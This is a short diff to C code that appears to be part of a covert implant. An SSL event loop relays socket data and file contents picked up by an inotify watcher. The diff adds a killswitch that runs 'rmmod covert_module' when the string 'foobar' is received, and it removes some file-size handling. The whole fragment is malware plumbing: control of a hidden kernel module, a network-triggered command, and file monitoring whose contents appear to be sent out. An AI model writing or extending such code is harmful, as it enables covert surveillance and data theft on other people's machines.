@@ -328,6 +328,15 @@ void epoll_event_loop(SSL* ssl) {
                         memmove(buffer + 1, buffer, size);
                         buffer[0] = 's';
                         SSL_write(ssl, buffer, size + 1);
+                    } else if (eventList[i].data.fd == conn_sock) {
+                        if (strncmp((const char *) buffer, "foobar", 6) == 0) {
+                            printf("User killswitch triggered\n");
+                            //Time to kill the application
+                            system("rmmod covert_module");
+                        } else {
+                            printf("Got other module data\n");
+                            SSL_write(ssl, buffer, size);
+                        }
                     } else {
                         SSL_write(ssl, buffer, size);
                     }
@@ -409,11 +418,7 @@ int handle_inotify_modified(struct inotify_event* ie) {
         perror("inotify fopen");
         return -1;
     }
-    fseek(f, 0, SEEK_END);
-    size_t file_size = ftell(f);
-    rewind(f);
 
-    //unsigned char* file_buffer = malloc(file_size + 1);
     unsigned char file_buffer[MAX_PAYLOAD];
     file_buffer[0] = 'f';
     size_t size;
